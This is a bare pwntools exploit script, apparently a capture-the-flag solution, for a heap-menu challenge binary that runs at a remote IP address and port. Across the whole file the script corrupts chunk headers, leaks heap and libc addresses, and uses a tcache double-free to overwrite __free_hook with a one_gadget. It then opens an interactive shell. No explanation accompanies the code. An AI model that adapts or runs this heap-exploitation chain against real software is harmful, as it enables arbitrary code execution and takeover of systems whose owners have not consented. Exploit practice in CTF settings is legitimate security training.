from pwn import*
def new(ch,content):
	p.sendlineafter('>>',str(ch))
	p.sendlineafter('>>','1')
	p.sendafter('data:',content)
def free(ch,index):
	p.sendlineafter('>>',str(ch))
	p.sendlineafter('>>','2')
	if ch!=4 and ch !=3:
		p.sendlineafter('index?',str(index))
def show(ch,index):
	p.sendlineafter('>>',str(ch))
	p.sendlineafter('>>','3')
	if ch!=4 and ch!=3:
		p.sendlineafter('index?',str(index))
context.log_level ='DEBUG'
p = process('./main')
p = remote('134.175.239.26',8848)
libc =ELF('./libc-2.27.so')
new(3,'\x00'*0x80 + p64(0) + p64(0xA1))
new(1,'FMYY')
new(1,'FMYY')
new(2,'FMYY')
free(2,0)
new(2,'\xB0')
show(2,0)
p.recvuntil('data: ')
heap_base = u64(p.recvuntil('\n',drop=True).ljust(8,'\x00')) - 0x124B0
log.info('HEAP:\t' + hex(heap_base))
new(2,'FMYY')
new(3,'FMYY')
new(4,'FMYY')
new(4,'\x00'*0x50 + p64(0) + p64(0x41))
free(2,0)
free(2,0)
new(2,p64(heap_base + 0x125E0))
new(2,p64(0) + p64(0x421))
free(1,0)
new(1,'FMYY')
show(1,0)
p.recvuntil('data: ')
libc_base = u64(p.recvuntil('\x7F')[-6:].ljust(8,'\x00')) - 0x60 -0x10 - libc.sym['__malloc_hook']
log.info('LIBC:\t' + hex(libc_base))
free_hook = libc_base + libc.sym['__free_hook']
rce = libc_base + 0x4F322
free(2,0)
free(2,0)
new(2,p64(free_hook))
new(2,p64(rce))
p.interactive()
